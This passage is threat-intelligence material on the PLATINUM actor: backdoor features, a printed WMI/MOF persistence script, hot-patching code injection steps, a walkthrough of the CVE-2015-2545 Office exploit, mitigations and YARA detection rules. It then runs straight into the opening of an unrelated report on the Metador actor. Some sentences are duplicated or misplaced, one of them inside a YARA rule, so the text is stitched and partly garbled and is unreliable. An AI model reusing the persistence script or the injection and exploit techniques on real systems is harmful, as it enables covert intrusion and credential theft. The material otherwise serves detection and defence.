One variant typically runs with a mutex named “hMSVmm” and installs itself in the folders %appdata%\Comm\Jpin and %userprofile%\AppData\Resource\Jpin. After it is installed and started, the JPIN service can perform the following tasks, among others: Obtain information about the computer, such as operating system version, user name, privileges, disk space, and so on. List running services, processes, job IDs, and task IDs. Enumerate drives and their types. Enumerate registry keys. Load a custom keylogger. Download files. Download and upgrade itself. Acquire network information such as DNS, IP, proxies, and so on. Exfiltrate information over HTTP GET and POST requests, with the data stored either within the HTTP body or within the URL parameters. Lower security settings by tampering with registry keys. Inject content into the lsass.exe process, in order to load the keylogger module into lsass and call its exported function. Communicate via FTP. Send email via SMTP. Change permissions on files using the cacls.exe command-line utility. JPIN can also target mobile suite applications and extract data from them. The backdoor contains code that looks for installed instances of Symbian, Blackberry, and Windows Phone management applications. If any are found, the backdoor logs sync dates, IMEI data, phone manufacturer and model information, software version date, memory, location, and capacity, among other things. The second JPIN variant is very similar to the first one. It downloads the backdoor payload from remote locations via the BITS service, using the COM object for BITS. This variant also has its own installer and uninstaller component, which deletes itself when it encounters a version of Windows earlier than Windows XP, or finds any of the processes listed in Figure 15 running. The third known variant does not check for the processes listed in Figure 15. It uses an installer component that includes the backdoor as payload disguised as a bitmap within its resource section. The payload is in an encrypted and compressed form, disguised to avoid any suspicion from security solutions.
This variant has been seen installing itself into the following file system paths: %appdata%\Java\support %appdata%\support %userprofile%\AppData\Local\Java\Support %userprofile%\AppData\Local\Support adbupd Another backdoor used by PLATINUM is very similar to the Dipsind family. It is informally referred to internally at Microsoft as “adbupd”, which is the name of the service under which it is installed. Salient features of this backdoor include the following: It tries to install itself under several different names within the Program Files directory It has the ability to support plug-ins to modularize functionality It contains a copy of the OpenSSL library to support encryption when sending or receiving data It contains functionality to run a copy of cmd.exe The configuration file is very similar to the original Dipsind family This backdoor class uses multiple methods of achieving persistence, one of which is using WMI/MOF compiled scripts, such as the one shown in Figure 16. JPIN can target mobile suite applications and extract data from them. Figure 16. WMI script used by the Adpupd backdoor to achieve persistence #pragma namespace("\\\\.\\ROOT\\cimv2") instance of __Win32Provider as $P {  Name = "adbupdConsumer";  ClsId = "{74ba9ce4-fbf1-4097-32b8-34f446f037d8}";  HostingModel = "LocalSystemHost"; }; instance of __EventConsumerProviderRegistration {  Provider = $P;  ConsumerClassNames = {"adbupdConsumer"}; }; class adbupdConsumer : __EventConsumer {  [key] string Mode; }; instance of adbupdConsumer as $CONSMR {  Mode = "persistent"; }; instance of __EventFilter as $FLT {  Name = "adbupdFilter";  Query = "SELECT * FROM __InstanceCreationEvent WHERE TargetInstance ISA \"Win32_NTLogEvent\"";  QueryLanguage = "WQL"; }; instance of __FilterToConsumerBinding as $B {  Consumer = $CONSMR;  Filter = $FLT; }; Keyloggers The PLATINUM group has written a few different versions of keyloggers that perform their functions in different ways, most likely to take advantage of different weaknesses in victims’ computing environments. The keyloggers can be broadly classified into two groups: those that log keystrokes through raw device input, and user mode keyloggers that use Windows hook interfaces to gather information. In particular, this second group also has the capability of dumping users’ credentials using the same technique employed by Mimikatz. Both groups can set permissions on specific files to Everyone, and work in tandem with the PLATINUM backdoors.
Hot patcher One of PLATINUM’s most recent and interesting tools is meant to inject code into processes using a variety of injection techniques. In addition to using several publicly known injection methods to perform this task, it also takes advantage of an obscure operating system feature known as hot patching. Hot patching is an operating system-supported feature for installing updates without having to reboot or restart a process. At a high level, hot patching can transparently apply patches to executables and DLLs in actively running processes, which does not happen with traditional methods of code injection such as CreateRemoteThread or WriteProcessMemory. Instead, the kernel is instructed to perform the injection by invoking NtSetSystemInformation (with an appropriate SystemInformationClass) to apply the patch. The information about the patch is delivered via a specially crafted DLL that is loaded into the target process. The hot patching feature originally shipped with Windows Server 2003 and was used to ship 10 patches to Windows Server 2003. It was removed in Windows 8 and has not been included in subsequent releases of Windows. PLATINUM appears to believe that enough of their targeted users continue to run the earlier versions of Windows to make the technique a useful tool, at least until early 2017 (see page 20). The technique PLATINUM uses to inject code via hot patching was first documented by security researchers in 2013.7 Administrator permissions are required for hot patching, and the technique used by PLATINUM does not attempt to evade this requirement through exploitation. Rather, the component’s use of the hot patching feature appears to be a way to avoid being detected, as many antivirus solutions monitor non-system processes for the regular injection methods such as CreateRemoteThread. If the tool fails to inject code using hot patching, it reverts to attempting the other more common code injection techniques into common Windows processes, primarily targeting winlogon.exe, lsass.exe and svchost.exe: CreateRemoteThread NtQueueApcThread RtlCreateUserThread NtCreateThreadEx The hot patching component performs the following steps: 1. It patches the loader with a proper hot patch to treat injected DLLs with execute page permissions.
This step is required for DLLs loaded from memory (in an attempt to further conceal the malicious code). 7 Alex Ionescu, “Hotpatching the Hotpatcher: Stealth File-less DLL Injection,” SyScan 2013, https://www.yumpu.com/en/document/view/14255220/alexsyscan13/23. 2. The backdoor is injected into svchost using the hot patch API. Patching the loader is done by creating a section named \knowndlls\mstbl.dll. This DLL does not reside on disk, but is rather treated as a cached DLL by the session manager. It then proceeds to write a PE file within that section. 3. The PE file will have one section (.hotp1) with the hot patch header structure. This structure contains all the information necessary to perform the patching of function ntdll!LdrpMapViewOfSection, which will cause the loader to treat created sections as PAGE_EXECUTE_READWRITE instead of PAGE_READWRITE. The patch is successfully applied by invoking NtSetSystemInformation. 4. After the memory permission issue is solved, the injector proceeds to inject the malicious DLL into svchost. Again, it creates a (now executable) section named knowndlls\fgrps.dll and invokes NtSetSystemInformation, which causes the final payload to be loaded and executed within the target process (svchost). 5. The malicious hot patching component appears to have an expiration date of January 15, 2017. After that date, the DLL will no longer perform the injection, but rather execute another PLATINUM implant (C:\Program Files\Windows Journal\Templates\Cpl\jnwmon.exe –ua), which may be related to an uninstall routine. (The component has not been observed in use since March 9, 2016, which may indicate that PLATINUM has chosen to stop using it earlier than the configured expiration date.) Miscellaneous Finally, the PLATINUM group also uses small single-purpose applications that duplicate some of the functionality of the backdoors. A couple of examples are: A stand-alone persistence tool that takes other files as input and ensures persistence across reboots. A stand-alone loader that runs another executable. It has some exported functions whose names can be used in DLL files installed as LSA password filters, but such functions are basically empty and there is no known evidence that this tool was ever used in this way.
On the whole, this DLL looks like a test, suggesting that the attackers may have researched and possibly implemented variants of their malware that can be installed as LSA password filters. Exploit (CVE-2015-2545) CVE-2015-2545 is a use-after-free vulnerability in the embedded PostScript filter of Microsoft Office.8 The exploit was crafted in PostScript and is able to bypass Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP). 8 Microsoft issued Security Bulletin MS15-099 in September 2015 to address the issue. This vulnerability allowed the attacker to forge a CAssoc structure, shown in Figure 17, and so also indirectly the PSObjs in the structure. The PostScript interpreter deciphers the value field (Val) based on the type field (m_type), which are under complete control of the attacker. Having developed this technique, the attacker will craft and use a combination of file, string, and integer objects to gain a reliable arbitrary code execution. Figure 17. Memory layout of CSssoc structure and its embedded PSObjs Root cause:The attacker defined in PostScript a dictionary with three elements, which leads to an allocation of three CAssoc structures in PSTMap. Within a Forall loop, the last two elements are undefined and a string is initialized. The PostScript statement results in a deallocation of the last two CAssoc structures and the string gets allocated in the previously freed memory address. The PostScript-put operand is used to fill the string with data to mimic a CAssoc structure. By setting the hash table index to 0x3ff, the loop will exit because the hash table at that time has a max-size of 0x400. Upon exiting the loop, a reference will be returned to the secondary element, which is the forged structure. Figure 18. Reusage of deallocated Memory by a forged CAssoc Structure Acquire full memory RW access: The described method is used to craft a PSString object in which the length of the string is set to a maximum value. As a result, the exploit can use PostScript methods to search for ROP gadgets to dynamically assemble a ROP shellcode. Figure 19.
Getinterval method of PSString is used to find ROP gadgets The purpose of this approach is to call VirtualProtect to set the pages of the second-stage shellcode as executable. As a result, DEP and ASLR are bypassed. Arbitrary code execution: To redirect code execution to the ROP chain, the exploit crafts a PSFile Object in which the vtable is controlled by the attacker. By calling the bytesavailable method within the PostScript code, arbitrary code execution is achieved. Identity Although the exact identity of PLATINUM remains unknown, the technical indicators observed so far can help create a profile of the attacker. Usage of multiple backdoors. The different backdoors written by or for the group indicate a considerable investment over time. Research indicates that PLATINUM has used multiple backdoors concurrently at times, which could represent either multiple teams within the activity group performing different campaigns, or different versions of the tools being used against varying victim networks. Zero day exploits. PLATINUM has used several zero-day exploits against their victims. Regardless of whether they researched the exploits themselves or purchased them from independent researchers, the monetary investment required to collect and deploy zero-day exploits at this level is considerable. Victim geography. More often than not, research into targeted attacks shows activity groups becoming opportunistic and attacking topical targets; that is, targets considered valuable based on the geopolitical events of the year. PLATINUM has consistently targeted victims within a small set of countries in South and Southeast Asia. In addition, the victims are consistently associated with a small set of entities that are directly or indirectly connected to governments. Tools. Some of the tools used by PLATINUM, such as the port-knocking backdoor, show signs of organized thinking. PLATINUM has developed or commissioned a number of custom tools to provide the group with access to victim resources. This behavior exhibits PLATINUM’s ability to adapt to victim networks, which is further evidence of the group’s considerable resources for development and maintenance. The monetary investment required to collect and deploy zero-day exploits at this level is considerable.
Any of these traits by themselves could be the work of a single resourceful attacker or a small group of like-minded individuals, but the presence of all of them is a clear indication of a wellresourced, focused, and disciplined group of attackers vying for information from governmentrelated entities. Guidance PLATINUM is an extremely difficult adversary for targeted organizations to defend against. It possesses a wide range of technical exploitation capabilities, significant resources for researching or purchasing complicated zero-day exploits, the ability to sustain persistence across victim networks for years, and the manpower to develop and maintain a large number of tools to use within unique victim networks. Their ability to research their victims prior to targeting them, along with the capability to architect exploits that only work once or for a short period of time, makes it very difficult to investigate or track their activities. That said, there are steps that organizations can take to reduce the likelihood of PLATINUM conducting successful attacks against their employees and networks. Take advantage of native mitigations built into Windows 10. Newer versions of Windows include critical mitigations that render some of PLATINUM’s exploits ineffective when deployed. For example, the summer 2015 attack that used the unusual ‘resume’ would not have been successful on Windows 10 as-is because of the presence of the Supervisor Mode Execution Prevention (SMEP) mitigation, even without the latest security updates installed. Even if CVE-2015-2546 affected Windows 10, the exploitation would have required much more technical prowess to succeed; ultimately, SMEP makes it more difficult for attackers. The hooking and in-memory patching techniques used by the malicious ‘hot patcher’ component are also not effective against newer versions of Windows. Apply all security updates as soon as they become available. Microsoft deeply researches each security issue, proactively addresses the flaw, and mitigates the attack surface around the affected component(s). For example, one zero-day vulnerability exploit (CVE-2015-2545) used by PLATINUM was addressed immediately in September 2015. Subsequently, in November, Microsoft also released a proactive security update for the same component that ended up mitigating other exploits surfacing in-the-wild after the first attack.
Customers who applied the security updates in November without delay would have been protected against the second wave of exploits. Such measures of hardening the underlying application happen often. MS09-017 is yet another example, in which installation of newly available security updates significantly reduced the attack surface. Consider disabling features, such as EPS or macros, in powerful products like Microsoft Office by using Group Policy. Not all organizations find the need to enable all features. For example, in the PLATINUM attack campaign that used CVE-2015-2545, a network in which Office EPS was disabled would not have been affected. Enterprise networks should segregate high business impact (HBI) data-holding segments from Internet-connected networks. Sharing of removable media between these air-gapped networks should be strictly enforced. In the case of PLATINUM, such a network architecture would prevent targeted users from accessing third-party email services and thereby granting attackers access to sensitive segments of the organizational network. Conduct enterprise software security awareness training, and build awareness of malware prevention. PLATINUM may have used zero-day flaws to compromise victim computers, but doing so required action by the user, who either clicked a link in an email or opened an attachment to allow the attacker to take control of their computer. Security training can raise awareness and reduce the risk associated with this attack vector. Institute a strong network firewall and proxy. Many tools used by attackers are not compatible with network proxies. In the case of PLATINUM’s version of portknocking, the opening of a UDP port would have been rendered moot if a network firewall was blocking access for inbound packets to the host’s open port. Enterprise networks should consider blocking certain types of websites that don’t serve the interest of the business. PLATINUM makes extensive use of C&Cs that use dynamic DNS hosts. Although such free services can be very useful at a personal level, blocking access to such hosts at a local DNS server can minimize post-compromise activity. Prepare your network to be forensically ready, so that you can achieve containment and recovery if a compromise occurs.
A forensically ready network that records authentications, password changes, and other significant network events can help identify affected systems quickly. Make sure that your organization’s Internet-facing assets are always running up-to-date applications and security updates, and that they are regularly audited for suspicious files and activity. A number of researched PLATINUM victims had their public-facing infrastructure compromised through unknown flaws. Detection indicators Figure 20 consists of detection rules for a number of PLATINUM malware samples to be used with YARA (https://plusvic.github.io/yara/), an open source pattern matching tool for malware detection. Figure 20. Detection indicators for PLATINUM malware rule Trojan_Win32_PlaSrv : Platinum {  meta:  author = "Microsoft"  description = "Hotpatching Injector"  original_sample_sha1 = "ff7f949da665ba8ce9fb01da357b51415634eaad"  unpacked_sample_sha1 = "dff2fee984ba9f5a8f5d97582c83fca4fa1fe131"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12" Apply all security updates as soon as they become available. strings:  $Section_name = ".hotp1"  $offset_x59 = { C7 80 64 01 00 00 00 00 01 00 }  condition:  $Section_name and $offset_x59 } rule Trojan_Win32_Platual : Platinum {  meta:  author = "Microsoft"  description = "Installer component"  original_sample_sha1 = "e0ac2ae221328313a7eee33e9be0924c46e2beb9"  unpacked_sample_sha1 = "ccaf36c2d02c3c5ca24eeeb7b1eae7742a23a86a"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $class_name = "AVCObfuscation"  $scrambled_dir = { A8 8B B8 E3 B1 D7 FE 85 51 32 3E C0 F1 B7 73 99 }  condition:  $class_name and $scrambled_dir } rule Trojan_Win32_Plaplex : Platinum {  meta:  author = "Microsoft"  description = "Variant of the JPin backdoor"  original_sample_sha1 = "ca3bda30a3cdc15afb78e54fa1bbb9300d268d66"  unpacked_sample_sha1 = "2fe3c80e98bbb0cf5a0c4da286cd48ec78130a24"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $class_name1 = "AVCObfuscation"  $class_name2 = "AVCSetiriControl"  condition:  $class_name1 and $class_name2 } rule Trojan_Win32_Dipsind_B : Platinum {  meta:  author = "Microsoft"  description = "Dipsind Family"  sample_sha1 = "09e0dfbb5543c708c0dd6a89fd22bbb96dc4ca1c"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $frg1 = {8D 90 04 01 00 00 33 C0 F2 AE F7 D1 2B F9 8B C1 8B F7 8B FA C1 E9 02 F3 A5 8B C8 83 E1 03 F3 A4 8B 4D EC 8B 15 ?? ?? ?? ?? 89 91 ??
07 00 00 }  $frg2 = {68 A1 86 01 00 C1 E9 02 F3 AB 8B CA 83 E1 03 F3 AA}  $frg3 = {C0 E8 07 D0 E1 0A C1 8A C8 32 D0 C0 E9 07 D0 E0 0A C8 32 CA 80 F1 63}  condition:  $frg1 and $frg2 and $frg3 } rule Trojan_Win32_PlaKeylog_B : Platinum {  meta:  author = "Microsoft"  description = "Keylogger component"  original_sample_sha1 = "0096a3e0c97b85ca75164f48230ae530c94a2b77"  unpacked_sample_sha1 = "6a1412daaa9bdc553689537df0a004d44f8a45fd"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $hook = {C6 06 FF 46 C6 06 25}  $dasm_engine = {80 C9 10 88 0E 8A CA 80 E1 07 43 88 56 03 80 F9 05}  condition:  $hook and $dasm_engine } rule Trojan_Win32_Adupib : Platinum {  meta:  author = "Microsoft"  description = "Adupib SSL Backdoor"  original_sample_sha1 = "d3ad0933e1b114b14c2b3a2c59d7f8a95ea0bcbd"  unpacked_sample_sha1 = "a80051d5ae124fd9e5cc03e699dd91c2b373978b"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = "POLL_RATE"  $str2 = "OP_TIME(end hour)"  $str3 = "%d:TCP:*:Enabled"  $str4 = "%s[PwFF_cfg%d]"  $str5 = "Fake_GetDlgItemTextW: ***value***="  condition:  $str1 and $str2 and $str3 and $str4 and $str5 } rule Trojan_Win32_PlaLsaLog : Platinum {  meta:  author = "Microsoft"  description = "Loader / possible incomplete LSA Password Filter"  original_sample_sha1 = "fa087986697e4117c394c9a58cb9f316b2d9f7d8"  unpacked_sample_sha1 = "29cb81dbe491143b2f8b67beaeae6557d8944ab4"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = {8A 1C 01 32 DA 88 1C 01 8B 74 24 0C 41 3B CE 7C EF 5B 5F C6 04 01 00 5E 81 C4 04 01 00 00 C3}  $str2 = "PasswordChangeNotify"  condition:  $str1 and $str2 } rule Trojan_Win32_Plagon : Platinum {  meta:  author = "Microsoft"  description = "Dipsind variant"  original_sample_sha1 = "48b89f61d58b57dba6a0ca857bce97bab636af65"  unpacked_sample_sha1 = "6dccf88d89ad7b8611b1bc2e9fb8baea41bdb65a"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = "VPLRXZHTU"  $str2 = {64 6F 67 32 6A 7E 6C}  $str3 = "Dqpqftk(Wou\"Isztk)"  $str4 = "StartThreadAtWinLogon"
 condition:  $str1 and $str2 and $str3 and $str4 } rule Trojan_Win32_Plakelog : Platinum {  meta:  author = "Microsoft"  description = "Raw-input based keylogger"  original_sample_sha1 = "3907a9e41df805f912f821a47031164b6636bd04"  unpacked_sample_sha1 = "960feeb15a0939ec0b53dcb6815adbf7ac1e7bb2"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = "<0x02>" wide  $str2 = "[CTR-BRK]" wide  $str3 = "[/WIN]" wide  $str4 = {8A 16 8A 18 32 DA 46 88 18 8B 15 08 E6 42 00 40 41 3B CA 72 EB 5E 5B}  condition:  $str1 and $str2 and $str3 and $str4 } rule Trojan_Win32_Plainst : Platinum {  meta:  author = "Microsoft"  description = "Installer component"  original_sample_sha1 = "99c08d31af211a0e17f92dd312ec7ca2b9469ecb"  unpacked_sample_sha1 = "dcb6cf7cf7c8fdfc89656a042f81136bda354ba6"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = {66 8B 14 4D 18 50 01 10 8B 45 08 66 33 14 70 46 66 89 54 77 FE 66 83 7C 77 FE 00 75 B7 8B 4D FC 89 41 08 8D 04 36 89 41 0C 89 79 04}  $str2 = {4b D3 91 49 A1 80 91 42 83 B6 33 28 36 6B 90 97}  condition: $str1 and $str2 } rule Trojan_Win32_Plagicom : Platinum {  meta:  author = "Microsoft"  description = "Installer component"  original_sample_sha1 = "99dcb148b053f4cef6df5fa1ec5d33971a58bd1e"  unpacked_sample_sha1 = "c1c950bc6a2ad67488e675da4dfc8916831239a7"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = {C6 44 24 ?? 68 C6 44 24 ?? 4D C6 44 24 ?? 53 C6 44 24 ?? 56 C6 44 24 ??
00}  $str2 = "OUEMM/EMM"  $str3 = {85 C9 7E 08 FE 0C 10 40 3B C1 7C F8 C3}  condition:  $str1 and $str2 and $str3 } rule Trojan_Win32_Plaklog : Platinum {  meta:  author = "Microsoft"  description = "Hook-based keylogger"  original_sample_sha1 = "831a5a29d47ab85ee3216d4e75f18d93641a9819"  unpacked_sample_sha1 = "e18750207ddbd939975466a0e01bd84e75327dda"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = "++[%s^^unknown^^%s]++"  $str2 = "vtfs43/emm"  $str3 = {33 C9 39 4C 24 08 7E 10 8B 44 24 04 03 C1 80 00 08 41 3B 4C 24 08 7C F0 C3}  condition:  $str1 and $str2 and $str3 } rule Trojan_Win32_Plapiio : Platinum {  meta:  author = "Microsoft"  description = "JPin backdoor"  original_sample_sha1 = "3119de80088c52bd8097394092847cd984606c88"  unpacked_sample_sha1 = "3acb8fe2a5eb3478b4553907a571b6614eb5455c"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = "ServiceMain"  $str2 = "Startup"  $str3 = {C6 45 ?? 68 C6 45 ?? 4D C6 45 ?? 53 C6 45 ?? 56 C6 45 ?? 6D C6 45 ??
6D}  condition:  $str1 and $str2 and $str3 } rule Trojan_Win32_Plabit : Platinum {  meta: author = "Microsoft"  description = "Installer component" sample_sha1 = "6d1169775a552230302131f9385135d385efd166" activity_group = "Platinum" version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = {4b D3 91 49 A1 80 91 42 83 B6 33 28 36 6B 90 97}  $str2 = "GetInstanceW"  $str3 = {8B D0 83 E2 1F 8A 14 0A 30 14 30 40 3B 44 24 04 72 EE}  condition:  $str1 and $str2 and $str3 } rule Trojan_Win32_Placisc2 : Platinum {  meta:  author = "Microsoft"  description = "Dipsind variant"  original_sample_sha1 = "bf944eb70a382bd77ee5b47548ea9a4969de0527"  unpacked_sample_sha1 = "d807648ddecc4572c7b04405f496d25700e0be6e"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = {76 16 8B D0 83 E2 07 8A 4C 14 24 8A 14 18 32 D1 88 14 18 40 3B C7 72 EA }  $str2 = "VPLRXZHTU"  $str3 = "%d) Command:%s"  $str4 = {0D 0A 2D 2D 2D 2D 2D 09 2D 2D 2D 2D 2D 2D 0D 0A}  condition:  $str1 and $str2 and $str3 and $str4 } rule Trojan_Win32_Placisc3 : Platinum {  meta:  author = "Microsoft"  description = "Dipsind variant"  original_sample_sha1 = "1b542dd0dacfcd4200879221709f5fa9683cdcda"  unpacked_sample_sha1 = "bbd4992ee3f3a3267732151636359cf94fb4575d"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = {BA 6E 00 00 00 66 89 95 ?? ?? FF FF B8 73 00 00 00 66 89 85 ?? ?? FF FF B9 64 00 00 00 66 89 8D ?? ?? FF FF BA 65 00 00 00 66 89 95 ?? ?? FF FF B8 6C 00 00 00}  $str2 = "VPLRXZHTU"  $str3 = {8B 44 24 ??
8A 04 01 41 32 C2 3B CF 7C F2 88 03}  condition:  $str1 and $str2 and $str3 } rule Trojan_Win32_Placisc4 : Platinum {  meta:  author = "Microsoft"  description = "Installer for Dipsind variant"  original_sample_sha1 = "3d17828632e8ff1560f6094703ece5433bc69586"  unpacked_sample_sha1 = "2abb8e1e9cac24be474e4955c63108ff86d1a034"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = {8D 71 01 8B C6 99 BB 0A 00 00 00 F7 FB 0F BE D2 0F BE 04 39 2B C2 88 04 39 84 C0 74 0A}  $str2 = {6A 04 68 00 20 00 00 68 00 00 40 00 6A 00 FF D5}  $str3 = {C6 44 24 ?? 64 C6 44 24 ?? 6F C6 44 24 ?? 67 C6 44 24 ?? 32 C6 44 24 ?? 6A}  condition:  $str1 and $str2 and $str3 } rule Trojan_Win32_Plakpers : Platinum {  meta:  author = "Microsoft"  description = "Injector / loader component"  original_sample_sha1 = "fa083d744d278c6f4865f095cfd2feabee558056"  unpacked_sample_sha1 = "3a678b5c9c46b5b87bfcb18306ed50fadfc6372e"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = "MyFileMappingObject"  $str2 = "[%.3u] %s %s %s [%s:" wide  $str3 = "%s\\{%s}\\%s" wide  condition:  $str1 and $str2 and $str3 } rule Trojan_Win32_Plainst2 : Platinum {  meta:  author = "Microsoft"  description = "Zc tool"  original_sample_sha1 = "3f2ce812c38ff5ac3d813394291a5867e2cddcf2"  unpacked_sample_sha1 = "88ff852b1b8077ad5a19cc438afb2402462fbd1a"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = "Connected [%s:%d]..."  $str2 = "reuse possible: %c"  $str3 = "] => %d%%\x0a"  condition:  $str1 and $str2 and $str3 } rule Trojan_Win32_Plakpeer : Platinum {  meta:  author = "Microsoft"  description = "Zc tool v2"  original_sample_sha1 = "2155c20483528377b5e3fde004bb604198463d29"  unpacked_sample_sha1 = "dc991ef598825daabd9e70bac92c79154363bab2"  activity_group = "Platinum"  version = "1.0"  last_modified = "2016-04-12"  strings:  $str1 = "@@E0020(%d)" wide  $str2 = /exit.{0,3}@exit.{0,3}new.{0,3}query.{0,3}rcz.{0,3}scz/ wide  $str3 = "---###---" wide  $str4 = "---@@@---" wide  condition:  $str1 and $str2 and $str3 and $str4 }THE MYSTERY OF METADOR | AN UNATTRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES Author: Amitai Ben Shushan Ehrlich, Aleksandar Milenkoski, Juan Andres Guerrero-Saade September 2022 SentinelLABS Research Team INDICATORS OF COMPROMISE ABOUT SENTINELLABS EXECUTIVE SUMMARY SentinelLabs Team SentinelLabs researchers uncovered a never-before-seen advanced threat actor we’ve dubbed ‘Metador’. Metador primarily targets telecommunications, internet service providers, and universities in several countries in the Middle East and Africa. The operators are highly aware of operations security, managing carefully segmented infrastructure per victim, and quickly deploying intricate countermeasures in the presence of security solutions. Despite their care for OPSEC, Metador operators do not prioritize deconfliction and regularly cohabitate with other known APTs while remaining undiscovered. Metador’s attack chains are designed to bypass native security solutions while deploying malware platforms directly into memory. SentinelLabs researchers discovered variants of two long-standing Windows malware platforms, and indications of an additional Linux implant. At this time, there’s no clear, reliable sense of attribution.

Traces point to multiple developers and operators that speak both English and Spanish, alongside varied cultural references including British pop punk lyrics and Argentinian political cartoons. While Metador appears primarily focused on enabling collection operations aligned with state interests, we’d point to the possibility of a high-end contractor arrangement not tied to a specific country. This release is a call to action for threat intelligence researchers, service providers, and defenders to collaborate on tracking an elusive adversary acting with impunity. OVERVIEW The term ‘Magnet of Threats’ is used to describe targets so desirable that multiple threat actors regularly cohabitate on the same victim machine in the course of their collection. A lack of concern for deconfliction has proven the folly of some of the most advanced threat actors known to cyber threat researchers, like Turla, APT28, Careto, Regin, and the Equation Group. In the process of responding to a series of tangled intrusions at one of these Magnets of Threats, SentinelLabs researchers encountered an entirely new threat actor.

We dubbed this threat actor ‘Metador’ in reference to the string “I am meta” in one of their malware samples and the expectation of Spanish-language responses from the command-and-control servers. The Magnet of Threats in question contained a redundant layering of nearly ten (10) known threat actors of Chinese and Iranian origin, including Moshen Dragon and MuddyWater. Among them, we noticed the use of an unusual LOLbin, the Microsoft Console Debugger ‘cdb.exe’. CDB was the root of an intricate infection chain that would yield two in-memory malware platforms and indications of additional Linux implants. Interestingly, the unknown threat actor noticed that their victim had begun to deploy a new security solution after their infection and quickly adapted in an attempt to respond to the presence of SentinelOne XDR. That swift response only did more to pique our interest. Metador is notable precisely in their pragmatic combination of rudimentary techniques (e.g.

LOLbins) with carefully executed advanced techniques (like per victim infrastructure segmentation, port knocking, and inscrutable custom anti-analysis techniques). Their operations are massively successful precisely in that they’ve eluded victims, defenders, and threat intel researchers until now despite maintaining these malware platforms for some time. We consider the discovery of Metador akin to a shark fin breaching the surface of the water. It’s a cause for foreboding that substantiates the need for the security industry to proactively engineer towards detecting the true uppercrust of threat actors that currently traverse networks with impunity. The threat intelligence industry has had amazing success catching glimpses of the absolute best threat actors out there but that has not translated into a consistent situational awareness of the breadth of their operations. The DuQu(s), Striders, PuzzleMakers, DePriMons, and PLATINUMs of this space elude us regularly and that should be cause for grave concern. In the case of Metador, the intrusions we uncovered were located primarily in telcos, ISPs, and universities in the Middle East and Africa.

We believe that we’ve only seen a small portion of the operations of what’s clearly a long-running threat actor of unknown origin and don’t exhaustively represent their target verticals or regions. We hope that further collaboration with the broader community will expand that situational awareness. Throughout our analysis, we retrieved and analyzed examples of two different malware platforms used by Metador–‘metaMain’ and ‘Mafalda’. These Windows-based platforms are intended to operate entirely inmemory and never touch disk in an unencrypted fashion. Their chosen loading mechanisms are novel only in their pragmatism, eluding native security products and standard Windows configurations with relative ease. The internal versioning of Mafalda suggests that this platform has been in use for some time, and its adaptability during our engagement alone highlights active and continuing development. We also found indications of additional implant(s): ‘Cryshell’– the developers reference an implant used for bouncing connections in an internal network to external command-and-control servers, with support for custom port knocking sequences.

Unknown Linux malware used to pilfer materials from other machines in the target environment and route their collection back to Mafalda. Due to a lag time in deploying adequate endpoint solutions to the relevant Linux servers, we were unable to recover the implant itself. There’s a possibility that this unknown Linux implant is equivalent to Cryshell but we can’t confirm that at this time. Part of the difficulty in tracking the breadth of Metador’s operations involves their strict adherence to infrastructure segmentation. The attackers use a single IP per victim and build. An analysis of the exhaust surrounding these servers was inconclusive in determining the trajectory of the data once at these VPSes. It’s possible that they serve merely as front-facing forwarders to a more complex anonymizer network, fitting with the general network OpSec observed. That said, open ports also allow for the possibility of meticulous manual administration. Our best efforts and the collaboration of the threat intelligence industry surfaced further a slightly broader view of this actor but far from a complete one.

We urge defenders in targeted verticals, regardless of location, to check their telemetry for the possible presence of Metador components and to share samples and indicators with the broader research community. The threat actor is highly aware of modern security solutions and adapts to counteract them quickly. In response to the deployment of SentinelOne XDR, the Metador developers pushed an updated version of their Mafalda in-memory implant retooled with new commands, different execution mechanisms, and paranoid custom anti-analysis techniques that proved extremely challenging to reverse through. The swift adaptable response set Metador apart among a rich hunting environment. Attributing Metador remains a garbled mystery. We encountered multiple languages, with diverse idiosyncrasies indicative of multiple developers. There are indications of a separation between developers and operators. And despite a lack of samples, the version history for at least one of the platforms suggests a history of development that extends far beyond the intrusions we’ve uncovered.

An interesting divergence in build times suggests a possible working timezone of UTC+1. And cultural references include a Latin American cartoon popular throughout the hispanic diaspora since the 1950s, as well as a quote from a popular 80’s British Pop Punk band. While the targets suggest state interests, we vaguely suspect a contractor arrangement. In the process of investigating this new threat, we had the assistance of multiple industry and government partners, providing technical assistance or telemetry wherever possible. We sincerely thank our collaborators. As we characterize Metador’s tools and operations, we hope that the wider research industry will help further elucidate the breadth of this new threat and help solve the mystery of Metador. TECHNICAL OVERVIEW The Magnet of Threats in question deployed our XDR solution after they’d been infected by Metador for several months. As such, we have no indication of the original infection vector employed in this or other infections.

